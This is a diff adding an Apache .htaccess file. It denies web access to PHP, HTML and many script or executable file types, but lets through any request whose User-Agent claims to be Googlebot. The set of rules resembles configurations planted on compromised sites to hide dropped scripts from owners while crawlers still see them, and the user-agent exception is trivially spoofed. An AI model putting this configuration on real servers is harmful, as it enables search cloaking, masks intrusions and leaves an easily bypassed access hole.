@@ -1,0 +1,10 @@
+<FilesMatch "\.(php|php3|php4|php5|phtml|shtml|html|htm|shtm)$">
+    Order Allow,Deny
+    Deny from all
+</FilesMatch>
+<Files ~ "\.(exe|com|msi|bat|cgi|pl|php|inc|In|fla|phps|phtml|phtm|shtml|html|htm|xml|php1|php2|php8|php3|php4|php5|php56|php54|php6|php7|ph|Ph|PH|py|pyc|pyo|pcgi|pcgi3|pcgi4|pcgi5|pchi6)$">
+  Order deny,allow
+  Deny from all
+  SetEnvIfNoCase User-Agent "Googlebot" goodbot
+  Allow from env=goodbot
+</Files>
